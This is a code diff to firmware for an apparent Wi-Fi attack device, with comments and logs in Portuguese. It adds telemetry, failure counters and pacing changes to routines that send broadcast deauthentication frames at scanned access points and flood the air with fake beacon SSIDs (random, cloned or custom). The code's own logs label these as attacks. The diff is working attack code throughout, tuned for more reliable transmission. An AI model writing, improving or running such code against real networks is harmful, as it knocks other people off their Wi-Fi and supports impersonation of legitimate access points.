@@ -125,13 +125,67 @@ void get_beacon_ssid(int idx, char* out, size_t outLen) {
   out[pos] = '\0';
 }
 
+// ── Telemetry & Failure Counters ──────────────────────────
+uint32_t deauth_fail_count  = 0;
+uint32_t beacon_fail_count  = 0;
+static uint32_t last_deauth_stat_ms = 0;
+static uint32_t last_beacon_stat_ms = 0;
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+size_t xPortGetFreeHeapSize(void);
+size_t xPortGetMinimumEverFreeHeapSize(void);
+#ifdef __cplusplus
+}
+#endif
+
+void log_system_diagnostics(const char* context) {
+  size_t free_heap = xPortGetFreeHeapSize();
+  size_t min_heap  = xPortGetMinimumEverFreeHeapSize();
+  uint8_t hw_ch    = 0;
+  int ch_res       = wext_get_channel(WLAN0_NAME, &hw_ch);
+
+  DEBUG_SER_PRINT("\n==================================================\n");
+  DEBUG_SER_PRINT("[SYS-DIAG] Contexto: ");
+  DEBUG_SER_PRINT(context);
+  DEBUG_SER_PRINT("\n");
+  DEBUG_SER_PRINT("  -> Heap Livre Atual   : ");
+  DEBUG_SER_PRINT((uint32_t)free_heap);
+  DEBUG_SER_PRINT(" bytes\n");
+  DEBUG_SER_PRINT("  -> Heap Min Historico : ");
+  DEBUG_SER_PRINT((uint32_t)min_heap);
+  DEBUG_SER_PRINT(" bytes\n");
+  DEBUG_SER_PRINT("  -> Canal HW Ativo     : ");
+  DEBUG_SER_PRINT((int)hw_ch);
+  if (ch_res != 0) {
+    DEBUG_SER_PRINT(" (wext_get_channel err=");
+    DEBUG_SER_PRINT(ch_res);
+    DEBUG_SER_PRINT(")");
+  }
+  DEBUG_SER_PRINT("\n");
+  DEBUG_SER_PRINT("  -> Uptime Sistema     : ");
+  DEBUG_SER_PRINT(millis());
+  DEBUG_SER_PRINT(" ms\n");
+  DEBUG_SER_PRINT("  -> Ptr rltk_wlan_info : 0x");
+  DEBUG_SER_PRINT((uint32_t)rltk_wlan_info, HEX);
+  DEBUG_SER_PRINT("\n");
+  DEBUG_SER_PRINT("==================================================\n");
+}
+
 // ── Deauth ────────────────────────────────────────────────
 static int last_hw_deauth_channel = -1;
 
 void start_deauth() {
+  DEBUG_SER_PRINT("\n[DEAUTH] >>> INICIANDO ATAQUE DEAUTH <<<\n");
+  reset_tx_telemetry();
+  log_system_diagnostics("START_DEAUTH");
+
   deauth_group_count = 0;
   current_group_idx  = 0;
   last_hw_deauth_channel = -1;
+  deauth_fail_count  = 0;
+  last_deauth_stat_ms= millis();
 
   // Se nenhum alvo foi marcado, mas temos scan_results, usa o alvo atualmente selecionado
   bool any_marked = false;
@@ -140,6 +194,11 @@ void start_deauth() {
   }
   if (!any_marked && !scan_results.empty() && net_sel < (int)scan_results.size()) {
     net_marked[net_sel] = true;
+    DEBUG_SER_PRINT("[DEAUTH] Nenhum alvo estava marcado. Auto-selecionado indice ");
+    DEBUG_SER_PRINT(net_sel);
+    DEBUG_SER_PRINT(": '");
+    DEBUG_SER_PRINT(scan_results[net_sel].ssid);
+    DEBUG_SER_PRINT("'\n");
   }
 
   for (int i = 0; i < (int)scan_results.size(); i++) {
@@ -160,18 +219,58 @@ void start_deauth() {
     }
   }
 
+  DEBUG_SER_PRINT("[DEAUTH] Grupos por canal formados: ");
+  DEBUG_SER_PRINT(deauth_group_count);
+  DEBUG_SER_PRINT("\n");
+
+  for (int g = 0; g < deauth_group_count; g++) {
+    DEBUG_SER_PRINT("  [Grupo ");
+    DEBUG_SER_PRINT(g);
+    DEBUG_SER_PRINT("] Canal ");
+    DEBUG_SER_PRINT(deauth_groups[g].channel);
+    DEBUG_SER_PRINT(" - Total Alvos: ");
+    DEBUG_SER_PRINT(deauth_groups[g].count);
+    DEBUG_SER_PRINT("\n");
+    for (int t = 0; t < deauth_groups[g].count; t++) {
+      int idx = deauth_groups[g].targets[t];
+      DEBUG_SER_PRINT("    -> Alvo ");
+      DEBUG_SER_PRINT(t);
+      DEBUG_SER_PRINT(": SSID='");
+      DEBUG_SER_PRINT(scan_results[idx].ssid);
+      DEBUG_SER_PRINT("' BSSID=");
+      DEBUG_SER_PRINT(scan_results[idx].bssid_str);
+      DEBUG_SER_PRINT(" Ch=");
+      DEBUG_SER_PRINT((int)scan_results[idx].channel);
+      DEBUG_SER_PRINT(" RSSI=");
+      DEBUG_SER_PRINT(scan_results[idx].rssi);
+      DEBUG_SER_PRINT(" dBm\n");
+    }
+  }
+
   if (deauth_group_count > 0) {
     isDeauthing       = true;
     sent_frames       = 0;
     current_group_idx = 0;
+    DEBUG_SER_PRINT("[DEAUTH] Ataque ativo com sucesso!\n");
+  } else {
+    DEBUG_SER_PRINT("[DEAUTH-WARN] Nenhum alvo configurado. Ataque nao iniciado.\n");
   }
 }
 
 void stop_deauth() {
+  DEBUG_SER_PRINT("\n[DEAUTH] >>> PARANDO ATAQUE DEAUTH <<<\n");
+  DEBUG_SER_PRINT("[DEAUTH] Total frames enviados: ");
+  DEBUG_SER_PRINT(sent_frames);
+  DEBUG_SER_PRINT(" | Falhas: ");
+  DEBUG_SER_PRINT(deauth_fail_count);
+  DEBUG_SER_PRINT("\n");
+  log_system_diagnostics("STOP_DEAUTH");
+
   isDeauthing        = false;
   deauth_group_count = 0;
   current_group_idx  = 0;
   last_hw_deauth_channel = -1;
+  deauth_fail_count  = 0;
 }
 
 void run_deauth_frame() {
@@ -179,42 +278,136 @@ void run_deauth_frame() {
 
   ChannelGroup &g = deauth_groups[current_group_idx % deauth_group_count];
   if (last_hw_deauth_channel != g.channel) {
-    wext_set_channel(WLAN0_NAME, g.channel);
+    int ch_ret = wext_set_channel(WLAN0_NAME, g.channel);
+    uint8_t verified_ch = 0;
+    wext_get_channel(WLAN0_NAME, &verified_ch);
+    if (ch_ret != 0 || verified_ch != g.channel) {
+      DEBUG_SER_PRINT("[DEAUTH-HW-ERR] Falha mudanca canal ");
+      DEBUG_SER_PRINT(g.channel);
+      DEBUG_SER_PRINT(" (wext ret=");
+      DEBUG_SER_PRINT(ch_ret);
+      DEBUG_SER_PRINT(", hw_ch=");
+      DEBUG_SER_PRINT((int)verified_ch);
+      DEBUG_SER_PRINT(")\n");
+    }
     last_hw_deauth_channel = g.channel;
-    delay(5); // aguarda o hardware trocar de canal antes de injetar
+    delay(15);
   }
 
-  // Envia `frames_per_deauth` bursts por alvo — padrão original do projeto.
-  // delay(1)+yield() entre bursts garante que o RTOS de Ameba possa processar
-  // outras tasks (WiFi driver, timer ISR) sem travar o loop().
-  for (int f = 0; f < frames_per_deauth; f++) {
-    for (int t = 0; t < g.count; t++) {
-      int idx = g.targets[t];
-      if (idx < (int)scan_results.size()) {
-        uint8_t bssid_copy[6];
-        memcpy(bssid_copy, scan_results[idx].bssid, 6);
-        wifi_tx_deauth_frame(bssid_copy, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
+  // Envia frames por alvo com respiração
+  for (int t = 0; t < g.count; t++) {
+    int idx = g.targets[t];
+    if (idx < (int)scan_results.size()) {
+      uint8_t bssid_copy[6];
+      memcpy(bssid_copy, scan_results[idx].bssid, 6);
+      int tx_res = wifi_tx_deauth_frame(bssid_copy, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
+      if (tx_res == TX_SUCCESS) {
         sent_frames++;
+      } else {
+        deauth_fail_count++;
+        DEBUG_SER_PRINT("[DEAUTH-FAIL] Cod=");
+        DEBUG_SER_PRINT(tx_res);
+        DEBUG_SER_PRINT(" (");
+        DEBUG_SER_PRINT(tx_status_str(tx_res));
+        DEBUG_SER_PRINT(") dump_ret=");
+        DEBUG_SER_PRINT(tx_telemetry.last_dump_ret);
+        DEBUG_SER_PRINT(" Ch=");
+        DEBUG_SER_PRINT(g.channel);
+        DEBUG_SER_PRINT(" Tgt='");
+        DEBUG_SER_PRINT(scan_results[idx].ssid);
+        DEBUG_SER_PRINT("' BSSID=");
+        DEBUG_SER_PRINT(scan_results[idx].bssid_str);
+        DEBUG_SER_PRINT(" Heap=");
+        DEBUG_SER_PRINT((uint32_t)xPortGetFreeHeapSize());
+        DEBUG_SER_PRINT(" B\n");
+
+        if (tx_res == TX_ERR_ALLOC_FRAME) {
+          delay(6);
+        }
       }
+      delay(10);
+      yield();
     }
-    delay(1);
-    yield();
+  }
+  yield();
+
+  // Pausa entre ciclos para drenar o TX ring
+  if (deauth_group_count == 1) {
+    delay(20);
+  } else {
+    delay(8);
   }
 
   current_group_idx = (current_group_idx + 1) % deauth_group_count;
+
+  // Telemetria periodica a cada 2000ms
+  if (millis() - last_deauth_stat_ms >= 2000) {
+    last_deauth_stat_ms = millis();
+    DEBUG_SER_PRINT("[DEAUTH-STAT] Enviados=");
+    DEBUG_SER_PRINT(sent_frames);
+    DEBUG_SER_PRINT(" | Falhas=");
+    DEBUG_SER_PRINT(deauth_fail_count);
+    DEBUG_SER_PRINT(" (AllocFail=");
+    DEBUG_SER_PRINT(tx_telemetry.tx_alloc_failures);
+    DEBUG_SER_PRINT(", DumpFail=");
+    DEBUG_SER_PRINT(tx_telemetry.tx_dump_failures);
+    DEBUG_SER_PRINT(") | Heap=");
+    DEBUG_SER_PRINT((uint32_t)xPortGetFreeHeapSize());
+    DEBUG_SER_PRINT(" B (Min=");
+    DEBUG_SER_PRINT((uint32_t)xPortGetMinimumEverFreeHeapSize());
+    DEBUG_SER_PRINT(" B) | Canal=");
+    DEBUG_SER_PRINT(g.channel);
+    DEBUG_SER_PRINT("\n");
+  }
 }
 
 // ── Beacon ────────────────────────────────────────────────
 void start_beacon() {
-  wext_set_channel(WLAN0_NAME, 1);
+  DEBUG_SER_PRINT("\n[BEACON] >>> INICIANDO BEACON FLOOD <<<\n");
+  reset_tx_telemetry();
+  log_system_diagnostics("START_BEACON");
+
+  int ch_res = wext_set_channel(WLAN0_NAME, 1);
+  uint8_t verified_ch = 0;
+  wext_get_channel(WLAN0_NAME, &verified_ch);
+  DEBUG_SER_PRINT("[BEACON] Canal configurado: 1 -> wext_res=");
+  DEBUG_SER_PRINT(ch_res);
+  DEBUG_SER_PRINT(" (hw_ch=");
+  DEBUG_SER_PRINT((int)verified_ch);
+  DEBUG_SER_PRINT(")\n");
   delay(5);
-  isBeaconing     = true;
-  beacon_frames   = 0;
-  beacon_ssid_idx = 0;
+
+  const char* mode_str = (beacon_mode == BEACON_MODE_RANDOM) ? "RANDOM" :
+                         (beacon_mode == BEACON_MODE_CLONE)  ? "CLONE" : "CUSTOM";
+  DEBUG_SER_PRINT("[BEACON] Modo: ");
+  DEBUG_SER_PRINT(mode_str);
+  DEBUG_SER_PRINT(" | Qtd SSIDs: ");
+  DEBUG_SER_PRINT(beacon_count);
+  if (beacon_mode == BEACON_MODE_CUSTOM) {
+    DEBUG_SER_PRINT(" | Nome Custom: '");
+    DEBUG_SER_PRINT(beacon_custom_ssid);
+    DEBUG_SER_PRINT("'");
+  }
+  DEBUG_SER_PRINT("\n");
+
+  isBeaconing        = true;
+  beacon_frames      = 0;
+  beacon_ssid_idx    = 0;
+  beacon_fail_count  = 0;
+  last_beacon_stat_ms= millis();
 }
 
 void stop_beacon() {
-  isBeaconing = false;
+  DEBUG_SER_PRINT("\n[BEACON] >>> PARANDO BEACON FLOOD <<<\n");
+  DEBUG_SER_PRINT("[BEACON] Total beacons enviados: ");
+  DEBUG_SER_PRINT(beacon_frames);
+  DEBUG_SER_PRINT(" | Falhas: ");
+  DEBUG_SER_PRINT(beacon_fail_count);
+  DEBUG_SER_PRINT("\n");
+  log_system_diagnostics("STOP_BEACON");
+
+  isBeaconing        = false;
+  beacon_fail_count  = 0;
 }
 
 void run_beacon_frame() {
@@ -230,14 +423,52 @@ void run_beacon_frame() {
 
   // yield antes de injetar: garante que o scheduler RTOS possa rodar antes do envio
   yield();
-  wifi_tx_beacon_frame(beacon_mac, broadcast_mac, ssidBuf);
-  beacon_frames++;
+  int tx_res = wifi_tx_beacon_frame(beacon_mac, broadcast_mac, ssidBuf);
+  if (tx_res == TX_SUCCESS) {
+    beacon_frames++;
+  } else {
+    beacon_fail_count++;
+    DEBUG_SER_PRINT("[BEACON-FAIL] Cod=");
+    DEBUG_SER_PRINT(tx_res);
+    DEBUG_SER_PRINT(" (");
+    DEBUG_SER_PRINT(tx_status_str(tx_res));
+    DEBUG_SER_PRINT(") dump_ret=");
+    DEBUG_SER_PRINT(tx_telemetry.last_dump_ret);
+    DEBUG_SER_PRINT(" SSID='");
+    DEBUG_SER_PRINT(ssidBuf);
+    DEBUG_SER_PRINT("' Heap=");
+    DEBUG_SER_PRINT((uint32_t)xPortGetFreeHeapSize());
+    DEBUG_SER_PRINT(" B\n");
+
+    if (tx_res == TX_ERR_ALLOC_FRAME) {
+      delay(6);
+    }
+  }
 
   // Pausa curta apos o envio permite ao driver liberar o TX descriptor.
-  // IMPORTANTE: delay() aqui é seguro pois estamos fora do contexto do driver.
-  delay(2);
+  delay(10);
   yield();
 
   // Advance through beacon_count SSIDs (wrapping)
   beacon_ssid_idx = (beacon_ssid_idx + 1) % safe_count;
-}
+
+  // Telemetria periodica a cada 2000ms
+  if (millis() - last_beacon_stat_ms >= 2000) {
+    last_beacon_stat_ms = millis();
+    DEBUG_SER_PRINT("[BEACON-STAT] Beacons=");
+    DEBUG_SER_PRINT(beacon_frames);
+    DEBUG_SER_PRINT(" | Falhas=");
+    DEBUG_SER_PRINT(beacon_fail_count);
+    DEBUG_SER_PRINT(" (AllocFail=");
+    DEBUG_SER_PRINT(tx_telemetry.tx_alloc_failures);
+    DEBUG_SER_PRINT(", DumpFail=");
+    DEBUG_SER_PRINT(tx_telemetry.tx_dump_failures);
+    DEBUG_SER_PRINT(") | Heap=");
+    DEBUG_SER_PRINT((uint32_t)xPortGetFreeHeapSize());
+    DEBUG_SER_PRINT(" B (Min=");
+    DEBUG_SER_PRINT((uint32_t)xPortGetMinimumEverFreeHeapSize());
+    DEBUG_SER_PRINT(" B) | Ultimo SSID='");
+    DEBUG_SER_PRINT(ssidBuf);
+    DEBUG_SER_PRINT("'\n");
+  }
+}
